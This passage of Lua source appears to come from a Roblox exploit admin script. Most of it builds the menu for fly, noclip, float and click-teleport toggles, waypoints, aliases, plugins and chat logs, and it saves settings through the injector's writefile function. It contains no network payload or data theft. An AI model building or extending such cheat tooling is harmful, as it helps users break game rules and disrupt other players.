Cmdbar_2.Size = UDim2.new(0, 150, 0, 20)
Cmdbar_2.Font = Enum.Font.SourceSans
Cmdbar_2.FontSize = Enum.FontSize.Size18
Cmdbar_2.Text = "Command"
Cmdbar_2.TextColor3 = Color3.new(1, 1, 1)
Cmdbar_2.TextScaled = true
Cmdbar_2.TextStrokeTransparency = 0
Cmdbar_2.TextWrapped = true

Toggles.Name = "Toggles"
Toggles.Parent = background_2
Toggles.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Toggles.BackgroundTransparency = 1
Toggles.BorderSizePixel = 0
Toggles.Position = UDim2.new(0, 150, 0, 50)
Toggles.Size = UDim2.new(0, 200, 0, 100)
Toggles.BottomImage = "rbxasset://textures/blackBkg_square.png"
Toggles.CanvasSize = UDim2.new(0, 0, 0, 0)
Toggles.MidImage = "rbxasset://textures/blackBkg_square.png"
Toggles.ScrollBarThickness = 8
Toggles.TopImage = "rbxasset://textures/blackBkg_square.png"

Fly.Name = "Fly"
Fly.Parent = Toggles
Fly.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Fly.BackgroundTransparency = 0.5
Fly.BorderSizePixel = 0
Fly.Size = UDim2.new(0, 200, 0, 20)
Fly.Font = Enum.Font.SourceSans
Fly.FontSize = Enum.FontSize.Size14
Fly.Text = "    Toggle Fly"
Fly.TextColor3 = Color3.new(1, 1, 1)
Fly.TextXAlignment = Enum.TextXAlignment.Left

Select_3.Name = "Select"
Select_3.Parent = Fly
Select_3.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_3.BorderSizePixel = 0
Select_3.Position = UDim2.new(0, 160, 0, 0)
Select_3.Size = UDim2.new(0, 40, 0, 20)
Select_3.Font = Enum.Font.SourceSans
Select_3.FontSize = Enum.FontSize.Size14
Select_3.Text = "Add"
Select_3.TextColor3 = Color3.new(0, 0, 0)

Noclip.Name = "Noclip"
Noclip.Parent = Toggles
Noclip.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Noclip.BackgroundTransparency = 0.5
Noclip.BorderSizePixel = 0
Noclip.Position = UDim2.new(0, 0, 0, 25)
Noclip.Size = UDim2.new(0, 200, 0, 20)
Noclip.Font = Enum.Font.SourceSans
Noclip.FontSize = Enum.FontSize.Size14
Noclip.Text = "    Toggle Noclip"
Noclip.TextColor3 = Color3.new(1, 1, 1)
Noclip.TextXAlignment = Enum.TextXAlignment.Left

Select_4.Name = "Select"
Select_4.Parent = Noclip
Select_4.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_4.BorderSizePixel = 0
Select_4.Position = UDim2.new(0, 160, 0, 0)
Select_4.Size = UDim2.new(0, 40, 0, 20)
Select_4.Font = Enum.Font.SourceSans
Select_4.FontSize = Enum.FontSize.Size14
Select_4.Text = "Add"
Select_4.TextColor3 = Color3.new(0, 0, 0)

Float.Name = "Float"
Float.Parent = Toggles
Float.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Float.BackgroundTransparency = 0.5
Float.BorderSizePixel = 0
Float.Position = UDim2.new(0, 0, 0, 50)
Float.Size = UDim2.new(0, 200, 0, 20)
Float.Font = Enum.Font.SourceSans
Float.FontSize = Enum.FontSize.Size14
Float.Text = "    Toggle Float"
Float.TextColor3 = Color3.new(1, 1, 1)
Float.TextXAlignment = Enum.TextXAlignment.Left

Select_5.Name = "Select"
Select_5.Parent = Float
Select_5.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_5.BorderSizePixel = 0
Select_5.Position = UDim2.new(0, 160, 0, 0)
Select_5.Size = UDim2.new(0, 40, 0, 20)
Select_5.Font = Enum.Font.SourceSans
Select_5.FontSize = Enum.FontSize.Size14
Select_5.Text = "Add"
Select_5.TextColor3 = Color3.new(0, 0, 0)

ClickTP.Name = "Click TP"
ClickTP.Parent = Toggles
ClickTP.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
ClickTP.BackgroundTransparency = 0.5
ClickTP.BorderSizePixel = 0
ClickTP.Position = UDim2.new(0, 0, 0, 75)
ClickTP.Size = UDim2.new(0, 200, 0, 20)
ClickTP.Font = Enum.Font.SourceSans
ClickTP.FontSize = Enum.FontSize.Size14
ClickTP.Text = "    Click TP (Hold Key & Click)"
ClickTP.TextColor3 = Color3.new(1, 1, 1)
ClickTP.TextXAlignment = Enum.TextXAlignment.Left

Select_6.Name = "Select"
Select_6.Parent = ClickTP
Select_6.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Select_6.BorderSizePixel = 0
Select_6.Position = UDim2.new(0, 160, 0, 0)
Select_6.Size = UDim2.new(0, 40, 0, 20)
Select_6.Font = Enum.Font.SourceSans
Select_6.FontSize = Enum.FontSize.Size14
Select_6.Text = "Add"
Select_6.TextColor3 = Color3.new(0, 0, 0)

Dark_7.Name = "Dark"
Dark_7.Parent = background_2
Dark_7.Active = true
Dark_7.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_7.BackgroundTransparency = 0.5
Dark_7.BorderSizePixel = 0
Dark_7.Size = UDim2.new(0, 360, 0, 5)

shadow_2.Name = "shadow"
shadow_2.Parent = KeybindEditor
shadow_2.BackgroundColor3 = Color3.new(255, 0,  255)
shadow_2.BorderColor3 = Color3.new(0, 0, 0)
shadow_2.BorderSizePixel = 0
shadow_2.Size = UDim2.new(0, 360, 0, 20)
shadow_2.ZIndex = 4

PopupText_2.Name = "PopupText"
PopupText_2.Parent = shadow_2
PopupText_2.BackgroundTransparency = 1
PopupText_2.Position = UDim2.new(0, 51, 0, 0)
PopupText_2.Size = UDim2.new(0.760355055, -16, 0.949999988, 0)
PopupText_2.ZIndex = 4
PopupText_2.Font = Enum.Font.SourceSans
PopupText_2.TextSize = 20
PopupText_2.Text = "Set Keybinds"
PopupText_2.TextColor3 = Color3.new(1, 1, 1)
PopupText_2.TextStrokeTransparency = 0
PopupText_2.TextWrapped = true

Exit_2.Name = "Exit"
Exit_2.Parent = shadow_2
Exit_2.BackgroundColor3 = Color3.new(1, 1, 1)
Exit_2.BackgroundTransparency = 1
Exit_2.Size = UDim2.new(0, 20, 0, 20)
Exit_2.ZIndex = 4
Exit_2.Image = "rbxassetid://2132544126"

PositionsFrame.Name = "PositionsFrame"
PositionsFrame.Parent = Settings
PositionsFrame.Active = true
PositionsFrame.BackgroundColor3 = Color3.new(255, 0,  255)
PositionsFrame.BorderSizePixel = 0
PositionsFrame.Size = UDim2.new(0, 250, 0, 175)
PositionsFrame.Position = UDim2.new(0, 0, 0, 175)

Close_3.Name = "Close"
Close_3.Parent = PositionsFrame
Close_3.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Close_3.BorderSizePixel = 0
Close_3.Position = UDim2.new(0, 205, 0, 150)
Close_3.Size = UDim2.new(0, 40, 0, 20)
Close_3.Font = Enum.Font.SourceSans
Close_3.FontSize = Enum.FontSize.Size14
Close_3.Text = "Close"
Close_3.TextColor3 = Color3.new(0, 0, 0)

Delete_5.Name = "Delete"
Delete_5.Parent = PositionsFrame
Delete_5.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_5.BorderSizePixel = 0
Delete_5.Position = UDim2.new(0, 5, 0, 150)
Delete_5.Size = UDim2.new(0, 40, 0, 20)
Delete_5.Font = Enum.Font.SourceSans
Delete_5.FontSize = Enum.FontSize.Size14
Delete_5.Text = "Clear"
Delete_5.TextColor3 = Color3.new(0, 0, 0)

Holder_4.Name = "Holder"
Holder_4.Parent = PositionsFrame
Holder_4.BackgroundColor3 = Color3.new(255, 0,  255)
Holder_4.BackgroundTransparency = 1
Holder_4.BorderSizePixel = 0
Holder_4.Position = UDim2.new(0, 0, 0, 0)
Holder_4.Selectable = false
Holder_4.Size = UDim2.new(0, 250, 0, 145)
Holder_4.BottomImage = "rbxasset://textures/blackBkg_square.png"
Holder_4.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_4.MidImage = "rbxasset://textures/blackBkg_square.png"
Holder_4.ScrollBarThickness = 8
Holder_4.TopImage = "rbxasset://textures/blackBkg_square.png"

Example_4.Name = "Example"
Example_4.Parent = PositionsFrame
Example_4.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Example_4.BackgroundTransparency = 0.5
Example_4.BorderSizePixel = 0
Example_4.Size = UDim2.new(0, 10, 0, 20)
Example_4.Visible = false
Example_4.Position = UDim2.new(0, 0, 0, -5)

Text_5.Name = "Text"
Text_5.Parent = Example_4
Text_5.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Text_5.BackgroundTransparency = 0.5
Text_5.BorderSizePixel = 0
Text_5.Position = UDim2.new(0, 10, 0, 0)
Text_5.Size = UDim2.new(0, 240, 0, 20)
Text_5.Font = Enum.Font.SourceSans
Text_5.FontSize = Enum.FontSize.Size14
Text_5.Text = "Position"
Text_5.TextColor3 = Color3.new(1, 1, 1)
Text_5.TextXAlignment = Enum.TextXAlignment.Left

Delete_6.Name = "Delete"
Delete_6.Parent = Text_5
Delete_6.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_6.BorderSizePixel = 0
Delete_6.Position = UDim2.new(0, 200, 0, 0)
Delete_6.Size = UDim2.new(0, 40, 0, 20)
Delete_6.Font = Enum.Font.SourceSans
Delete_6.FontSize = Enum.FontSize.Size14
Delete_6.Text = "Delete"
Delete_6.TextColor3 = Color3.new(0, 0, 0)

TP.Name = "TP"
TP.Parent = Text_5
TP.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
TP.BorderSizePixel = 0
TP.Position = UDim2.new(0, 155, 0, 0)
TP.Size = UDim2.new(0, 40, 0, 20)
TP.Font = Enum.Font.SourceSans
TP.FontSize = Enum.FontSize.Size14
TP.Text = "Goto"
TP.TextColor3 = Color3.new(0, 0, 0)

AliasesFrame.Name = "AliasesFrame"
AliasesFrame.Parent = Settings
AliasesFrame.Active = true
AliasesFrame.BackgroundColor3 = Color3.new(255, 0,  255)
AliasesFrame.BorderSizePixel = 0
AliasesFrame.Position = UDim2.new(0, 0, 0, 175)
AliasesFrame.Size = UDim2.new(0, 250, 0, 175)

Close_2.Name = "Close"
Close_2.Parent = AliasesFrame
Close_2.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Close_2.BorderSizePixel = 0
Close_2.Position = UDim2.new(0, 205, 0, 150)
Close_2.Size = UDim2.new(0, 40, 0, 20)
Close_2.Font = Enum.Font.SourceSans
Close_2.FontSize = Enum.FontSize.Size14
Close_2.Text = "Close"
Close_2.TextColor3 = Color3.new(0, 0, 0)

Delete_3.Name = "Delete"
Delete_3.Parent = AliasesFrame
Delete_3.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_3.BorderSizePixel = 0
Delete_3.Position = UDim2.new(0, 5, 0, 150)
Delete_3.Size = UDim2.new(0, 40, 0, 20)
Delete_3.Font = Enum.Font.SourceSans
Delete_3.FontSize = Enum.FontSize.Size14
Delete_3.Text = "Clear"
Delete_3.TextColor3 = Color3.new(0, 0, 0)

Holder_3.Name = "Holder"
Holder_3.Parent = AliasesFrame
Holder_3.BackgroundColor3 = Color3.new(255, 0,  255)
Holder_3.BackgroundTransparency = 1
Holder_3.BorderSizePixel = 0
Holder_3.Position = UDim2.new(0, 0, 0, 0)
Holder_3.Size = UDim2.new(0, 250, 0, 145)
Holder_3.BottomImage = "rbxasset://textures/blackBkg_square.png"
Holder_3.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_3.MidImage = "rbxasset://textures/blackBkg_square.png"
Holder_3.ScrollBarThickness = 0
Holder_3.TopImage = "rbxasset://textures/blackBkg_square.png"

Example_3.Name = "Example"
Example_3.Parent = AliasesFrame
Example_3.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Example_3.BackgroundTransparency = 0.5
Example_3.BorderSizePixel = 0
Example_3.Size = UDim2.new(0, 10, 0, 20)
Example_3.Visible = false

Text_4.Name = "Text"
Text_4.Parent = Example_3
Text_4.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Text_4.BackgroundTransparency = 0.5
Text_4.BorderSizePixel = 0
Text_4.Position = UDim2.new(0, 10, 0, 0)
Text_4.Size = UDim2.new(0, 240, 0, 20)
Text_4.Font = Enum.Font.SourceSans
Text_4.FontSize = Enum.FontSize.Size14
Text_4.Text = "honk"
Text_4.TextColor3 = Color3.new(1, 1, 1)
Text_4.TextXAlignment = Enum.TextXAlignment.Left

Delete_4.Name = "Delete"
Delete_4.Parent = Text_4
Delete_4.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_4.BorderSizePixel = 0
Delete_4.Position = UDim2.new(0, 200, 0, 0)
Delete_4.Size = UDim2.new(0, 40, 0, 20)
Delete_4.Font = Enum.Font.SourceSans
Delete_4.FontSize = Enum.FontSize.Size14
Delete_4.Text = "Delete"
Delete_4.TextColor3 = Color3.new(0, 0, 0)

PluginsFrame.Name = "PluginsFrame"
PluginsFrame.Parent = Settings
PluginsFrame.Active = true
PluginsFrame.BackgroundColor3 = Color3.new(255, 0,  255)
PluginsFrame.BorderSizePixel = 0
PluginsFrame.Position = UDim2.new(0, 0, 0, 175)
PluginsFrame.Size = UDim2.new(0, 250, 0, 175)

Close_4.Name = "Close"
Close_4.Parent = PluginsFrame
Close_4.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Close_4.BorderSizePixel = 0
Close_4.Position = UDim2.new(0, 205, 0, 150)
Close_4.Size = UDim2.new(0, 40, 0, 20)
Close_4.Font = Enum.Font.SourceSans
Close_4.FontSize = Enum.FontSize.Size14
Close_4.Text = "Close"
Close_4.TextColor3 = Color3.new(0, 0, 0)

Add_3.Name = "Add"
Add_3.Parent = PluginsFrame
Add_3.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Add_3.BorderSizePixel = 0
Add_3.Position = UDim2.new(0, 5, 0, 150)
Add_3.Size = UDim2.new(0, 40, 0, 20)
Add_3.Font = Enum.Font.SourceSans
Add_3.FontSize = Enum.FontSize.Size14
Add_3.Text = "Add"
Add_3.TextColor3 = Color3.new(0, 0, 0)

Holder_5.Name = "Holder"
Holder_5.Parent = PluginsFrame
Holder_5.BackgroundColor3 = Color3.new(255, 0,  255)
Holder_5.BackgroundTransparency = 1
Holder_5.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Holder_5.BorderSizePixel = 0
Holder_5.Position = UDim2.new(0, 0, 0, 0)
Holder_5.Selectable = false
Holder_5.Size = UDim2.new(0, 250, 0, 140)
Holder_5.BottomImage = "rbxasset://textures/blackBkg_square.png"
Holder_5.CanvasSize = UDim2.new(0, 0, 0, 0)
Holder_5.MidImage = "rbxasset://textures/blackBkg_square.png"
Holder_5.ScrollBarThickness = 0
Holder_5.TopImage = "rbxasset://textures/blackBkg_square.png"

Example_5.Name = "Example"
Example_5.Parent = PluginsFrame
Example_5.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Example_5.BackgroundTransparency = 0.5
Example_5.BorderSizePixel = 0
Example_5.Size = UDim2.new(0, 10, 0, 20)
Example_5.Visible = false

Text_6.Name = "Text"
Text_6.Parent = Example_5
Text_6.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Text_6.BackgroundTransparency = 0.5
Text_6.BorderSizePixel = 0
Text_6.Position = UDim2.new(0, 10, 0, 0)
Text_6.Size = UDim2.new(0, 240, 0, 20)
Text_6.Font = Enum.Font.SourceSans
Text_6.FontSize = Enum.FontSize.Size14
Text_6.Text = "F4 > Toggle Fly"
Text_6.TextColor3 = Color3.new(1, 1, 1)
Text_6.TextXAlignment = Enum.TextXAlignment.Left

Delete_7.Name = "Delete"
Delete_7.Parent = Text_6
Delete_7.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Delete_7.BorderSizePixel = 0
Delete_7.Position = UDim2.new(0, 200, 0, 0)
Delete_7.Size = UDim2.new(0, 40, 0, 20)
Delete_7.Font = Enum.Font.SourceSans
Delete_7.FontSize = Enum.FontSize.Size14
Delete_7.Text = "Delete"
Delete_7.TextColor3 = Color3.new(0, 0, 0)

PluginEditor.Name = randomString()
PluginEditor.Parent = PARENT
PluginEditor.Active = true
PluginEditor.BackgroundColor3 = Color3.new(1, 1, 1)
PluginEditor.BackgroundTransparency = 1
PluginEditor.Position = UDim2.new(0.5, -180, 0, -400)
PluginEditor.Size = UDim2.new(0, 360, 0, 20)
PluginEditor.ZIndex = 4

background_3.Name = "background"
background_3.Parent = PluginEditor
background_3.BackgroundColor3 = Color3.new(255, 0,  255)
background_3.BorderSizePixel = 0
background_3.Position = UDim2.new(0, 0, 0, 20)
background_3.Size = UDim2.new(0, 360, 0, 160)

Dark_8.Name = "Dark"
Dark_8.Parent = background_3
Dark_8.Active = true
Dark_8.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_8.BackgroundTransparency = 0.5
Dark_8.BorderSizePixel = 0
Dark_8.Size = UDim2.new(0, 360, 0, 5)

Dark_9.Name = "Dark"
Dark_9.Parent = background_3
Dark_9.Active = true
Dark_9.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_9.BackgroundTransparency = 0.5
Dark_9.BorderSizePixel = 0
Dark_9.Position = UDim2.new(0, 220, 0, 5)
Dark_9.Size = UDim2.new(0, 5, 0, 155)

Img.Name = "Img"
Img.Parent = background_3
Img.BackgroundColor3 = Color3.new(1, 1, 1)
Img.BackgroundTransparency = 1
Img.Position = UDim2.new(0, 242, 0, 3)
Img.Size = UDim2.new(0, 100, 0, 95)
Img.Image = "rbxassetid://318740854"

AddPlugin.Name = "AddPlugin"
AddPlugin.Parent = background_3
AddPlugin.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
AddPlugin.BackgroundTransparency = 0.5
AddPlugin.BorderSizePixel = 0
AddPlugin.Position = UDim2.new(0, 235, 0, 100)
AddPlugin.Size = UDim2.new(0, 115, 0, 50)
AddPlugin.Font = Enum.Font.SourceSans
AddPlugin.FontSize = Enum.FontSize.Size18
AddPlugin.Text = "Add Plugin"
AddPlugin.TextColor3 = Color3.new(1, 1, 1)
AddPlugin.TextStrokeTransparency = 0

FileName.Name = "FileName"
FileName.Parent = background_3
FileName.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
FileName.BackgroundTransparency = 0.5
FileName.BorderSizePixel = 0
FileName.Position = UDim2.new(0.027777778, 0, 0.625, 0)
FileName.Size = UDim2.new(0, 200, 0, 50)
FileName.Font = Enum.Font.SourceSans
FileName.FontSize = Enum.FontSize.Size18
FileName.Text = "Plugin File Name"
FileName.TextColor3 = Color3.new(1, 1, 1)
FileName.TextStrokeTransparency = 0

About.Name = "About"
About.Parent = background_3
About.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
About.BackgroundTransparency = 1
About.BorderSizePixel = 0
About.Position = UDim2.new(0, 17, 0, 17)
About.Size = UDim2.new(0, 187, 0, 49)
About.Font = Enum.Font.SourceSansBold
About.FontSize = Enum.FontSize.Size14
About.Text = "Plugins are .iy files and should be located in the 'workspace' folder of your exploit."
About.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
About.TextStrokeTransparency = 0
About.TextWrapped = true
About.TextYAlignment = Enum.TextYAlignment.Top

Directions_2.Name = "Directions"
Directions_2.Parent = background_3
Directions_2.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Directions_2.BackgroundTransparency = 1
Directions_2.BorderSizePixel = 0
Directions_2.Position = UDim2.new(0, 17, 0, 66)
Directions_2.Size = UDim2.new(0, 187, 0, 49)
Directions_2.Font = Enum.Font.SourceSansBold
Directions_2.FontSize = Enum.FontSize.Size14
Directions_2.Text = "Type the name of the plugin file you want to add below."
Directions_2.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
Directions_2.TextStrokeTransparency = 0
Directions_2.TextWrapped = true
Directions_2.TextYAlignment = Enum.TextYAlignment.Top

shadow_3.Name = "shadow"
shadow_3.Parent = PluginEditor
shadow_3.BackgroundColor3 = Color3.new(255, 0,  255)
shadow_3.BorderColor3 = Color3.new(0, 0, 0)
shadow_3.BorderSizePixel = 0
shadow_3.Size = UDim2.new(0, 360, 0, 20)
shadow_3.ZIndex = 4

PopupText_3.Name = "PopupText"
PopupText_3.Parent = shadow_3
PopupText_3.BackgroundTransparency = 1
PopupText_3.Position = UDim2.new(0, 51, 0, 0)
PopupText_3.Size = UDim2.new(0.760355055, -16, 0.949999988, 0)
PopupText_3.ZIndex = 4
PopupText_3.Font = Enum.Font.SourceSans
PopupText_3.TextSize = 20
PopupText_3.Text = "Add Plugins"
PopupText_3.TextColor3 = Color3.new(1, 1, 1)
PopupText_3.TextStrokeTransparency = 0
PopupText_3.TextWrapped = true

Exit_3.Name = "Exit"
Exit_3.Parent = shadow_3
Exit_3.BackgroundColor3 = Color3.new(1, 1, 1)
Exit_3.BackgroundTransparency = 1
Exit_3.Size = UDim2.new(0, 20, 0, 20)
Exit_3.ZIndex = 4
Exit_3.Image = "rbxassetid://2132544126"

logsDrag.Name = randomString()
logsDrag.Parent = PARENT
logsDrag.Active = true
logsDrag.BackgroundColor3 = Color3.new(1, 1, 1)
logsDrag.BackgroundTransparency = 1
logsDrag.Position = UDim2.new(0, 0, 1, 10)
logsDrag.Size = UDim2.new(0, 338, 0, 20)
logsDrag.ZIndex = 4

shadow.Name = "shadow"
shadow.Parent = logsDrag
shadow.BackgroundColor3 = Color3.new(255, 0,  255)
shadow.BorderColor3 = Color3.new(0, 0, 0)
shadow.BorderSizePixel = 0
shadow.Position = UDim2.new(0, 0, 0.00999999978, 0)
shadow.Size = UDim2.new(0, 338, 0, 20)
shadow.ZIndex = 4

Hide.Name = "Hide"
Hide.Parent = shadow
Hide.BackgroundColor3 = Color3.new(1, 1, 1)
Hide.BackgroundTransparency = 1
Hide.Position = UDim2.new(0, 20, 0, 0)
Hide.Size = UDim2.new(0, 20, 0, 20)
Hide.ZIndex = 4
Hide.Image = "rbxassetid://2406617031"
Hide.ImageTransparency = 0.5

PopupText.Name = "PopupText"
PopupText.Parent = shadow
PopupText.BackgroundTransparency = 1
PopupText.Position = UDim2.new(0, 48, 0, 0)
PopupText.Size = UDim2.new(0.760355055, -16, 0.949999988, 0)
PopupText.ZIndex = 4
PopupText.Font = Enum.Font.SourceSans
PopupText.TextSize = 20
PopupText.Text = "Chat Logs"
PopupText.TextColor3 = Color3.new(1, 1, 1)
PopupText.TextStrokeTransparency = 0
PopupText.TextWrapped = true

Exit.Name = "Exit"
Exit.Parent = shadow
Exit.BackgroundColor3 = Color3.new(1, 1, 1)
Exit.BackgroundTransparency = 1
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.ZIndex = 4
Exit.Image = "rbxassetid://2132544126"

scroll.Name = "scroll"
scroll.Parent = logsDrag
scroll.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
scroll.BackgroundTransparency = 0.5
scroll.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
scroll.BorderSizePixel = 0
scroll.Position = UDim2.new(0, 5, 0, 30)
scroll.Size = UDim2.new(0, 328, 0, 190)
scroll.ZIndex = 5
scroll.BottomImage = "rbxasset://textures/blackBkg_square.png"
scroll.CanvasSize = UDim2.new(0, 0, 0, 10)
scroll.MidImage = "rbxasset://textures/blackBkg_square.png"
scroll.ScrollBarThickness = 8
scroll.TopImage = "rbxasset://textures/blackBkg_square.png"

background.Name = "background"
background.Parent = logsDrag
background.BackgroundColor3 = Color3.new(255, 0,  255)
background.BorderColor3 = Color3.new(0, 0, 0)
background.BorderSizePixel = 0
background.Position = UDim2.new(0, 0, 1, 0)
background.Size = UDim2.new(0, 338, 0, 230)
background.ZIndex = 4

Dark_6.Name = "Dark"
Dark_6.Parent = background
Dark_6.Active = true
Dark_6.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
Dark_6.BackgroundTransparency = 0.5
Dark_6.BorderSizePixel = 0
Dark_6.Size = UDim2.new(0, 338, 0, 5)
Dark_6.ZIndex = 4

Clear.Name = "Clear"
Clear.Parent = background
Clear.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Clear.BorderSizePixel = 0
Clear.Position = UDim2.new(0, 5, 0, 205)
Clear.Size = UDim2.new(0, 50, 0, 20)
Clear.ZIndex = 4
Clear.Font = Enum.Font.SourceSans
Clear.FontSize = Enum.FontSize.Size14
Clear.Text = "Clear"
Clear.TextColor3 = Color3.new(0, 0, 0)

Toggle.Name = "Toggle"
Toggle.Parent = background
Toggle.BackgroundColor3 = Color3.new(0.439216, 0.439216, 0.439216)
Toggle.BorderSizePixel = 0
Toggle.Position = UDim2.new(0, 60, 0, 205)
Toggle.Size = UDim2.new(0, 50, 0, 20)
Toggle.ZIndex = 4
Toggle.Font = Enum.Font.SourceSans
Toggle.FontSize = Enum.FontSize.Size14
Toggle.Text = "Disabled"
Toggle.TextColor3 = Color3.new(0, 0, 0)

function writefileExploit()
	if writefile then
		return true
	end
end

function isNumber(str)
	return tonumber(str) ~= nil
end

function tools(plr)
	if plr.Backpack:FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool') then
		return true
	end
end

function r15(plr)
	if plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
		return true
	end
end

defaultsettings = {
	prefix = ';';
	StayOpen = false;
	logsEnabled = false;
	aliases = {};
	binds = {};
	WayPoints = {};
	PluginsTable = {}
}

defaults = game:GetService("HttpService"):JSONEncode(defaultsettings)

local nosaves = false

function saves()
	if writefileExploit() then
		if pcall(function() readfile("IY_FE.iy") end) then
			if readfile("IY_FE.iy") ~= nil then
				local json = game:GetService("HttpService"):JSONDecode(readfile("IY_FE.iy"))
				if json.prefix ~= nil then prefix = json.prefix else prefix = ';' end
				if json.StayOpen ~= nil then StayOpen = json.StayOpen else StayOpen = false end
				if json.logsEnabled ~= nil then logsEnabled = json.logsEnabled else logsEnabled = false end
				if json.aliases ~= nil then aliases = json.aliases else aliases = {} end
				if json.binds ~= nil then binds = json.binds else binds = {} end
				if json.WayPoints ~= nil then WayPoints = json.WayPoints else WayPoints = {} end
				if json.PluginsTable ~= nil then PluginsTable = json.PluginsTable else PluginsTable = {} end
			else
				writefile("IY_FE.iy", defaults)
				wait()
				saves()
			end
		else
			writefile("IY_FE.iy", defaults)
			wait()
			if pcall(function() readfile("IY_FE.iy") end) then
				saves()
			else
				nosaves = true
				prefix = ';'
				StayOpen = false
				logsEnabled = false
				aliases = {}
				binds = {}
				WayPoints = {}
				PluginsTable = {}
				
				local FileError = Instance.new("Frame")
				local background = Instance.new("Frame")
				local Directions = Instance.new("TextLabel")
				local Dark = Instance.new("Frame")
				local shadow = Instance.new("Frame")
				local PopupText = Instance.new("TextLabel")
				local Exit = Instance.new("ImageButton")
				
				FileError.Name = randomString()
				FileError.Parent = PARENT
				FileError.Active = true
				FileError.BackgroundColor3 = Color3.new(1, 1, 1)
				FileError.BackgroundTransparency = 1
				FileError.Position = UDim2.new(0.5, -180, 0, 290)
				FileError.Size = UDim2.new(0, 360, 0, 20)
				FileError.ZIndex = 4
				
				background.Name = "background"
				background.Parent = FileError
				background.BackgroundColor3 = Color3.new(255, 0,  255)
				background.BorderSizePixel = 0
				background.Position = UDim2.new(0, 0, 0, 20)
				background.Size = UDim2.new(0, 360, 0, 210)
				
				Directions.Name = "Directions"
				Directions.Parent = background
				Directions.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
				Directions.BackgroundTransparency = 1
				Directions.BorderSizePixel = 0
				Directions.Position = UDim2.new(0, 10, 0, 15)
				Directions.Size = UDim2.new(0, 340, 0, 185)
				Directions.Font = Enum.Font.SourceSansBold
				Directions.FontSize = Enum.FontSize.Size14
				Directions.Text = "There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again."
				Directions.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
				Directions.TextStrokeTransparency = 0
				Directions.TextWrapped = true
				Directions.TextXAlignment = Enum.TextXAlignment.Left
				Directions.TextYAlignment = Enum.TextYAlignment.Top
				
				Dark.Name = "Dark"
				Dark.Parent = background
				Dark.Active = true
				Dark.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)
				Dark.BackgroundTransparency = 0.5
				Dark.BorderSizePixel = 0
				Dark.Size = UDim2.new(0, 360, 0, 5)
				
				shadow.Name = "shadow"
				shadow.Parent = FileError
				shadow.BackgroundColor3 = Color3.new(255, 0,  255)
				shadow.BorderColor3 = Color3.new(0, 0, 0)
				shadow.BorderSizePixel = 0
				shadow.Size = UDim2.new(0, 360, 0, 20)
				shadow.ZIndex = 4
				
				PopupText.Name = "PopupText"
				PopupText.Parent = shadow
				PopupText.BackgroundTransparency = 1
				PopupText.Position = UDim2.new(0, 51, 0, 0)
				PopupText.Size = UDim2.new(0.760355055, -16, 0.949999988, 0)
				PopupText.ZIndex = 4
				PopupText.Font = Enum.Font.SourceSans
				PopupText.FontSize = Enum.FontSize.Size24
				PopupText.Text = "File Error"
				PopupText.TextColor3 = Color3.new(1, 1, 1)
				PopupText.TextStrokeTransparency = 0
				PopupText.TextWrapped = true
				
				Exit.Name = "Exit"
				Exit.Parent = shadow
				Exit.BackgroundColor3 = Color3.new(1, 1, 1)
				Exit.BackgroundTransparency = 1
				Exit.Size = UDim2.new(0, 20, 0, 20)
				Exit.ZIndex = 4
